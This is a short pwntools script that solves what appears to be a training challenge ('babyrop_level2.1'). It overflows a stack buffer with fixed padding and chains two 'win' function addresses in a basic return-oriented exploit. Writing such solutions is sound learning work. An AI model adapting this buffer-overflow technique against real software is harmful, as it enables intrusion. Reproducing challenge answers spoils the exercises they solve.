from pwn import *

binary = '/challenge/babyrop_level2.1'

p = process(binary)

win1 = 0x000000000040126d
win2 = 0x000000000040131a

#gdb.attach(p, '''
#b * challenge
#''')

offset = 0x70 + 8
payload = flat(
	b'A' * offset,
	p64(win1),
	p64(win2)
)
p.sendline(payload)
p.interactive()
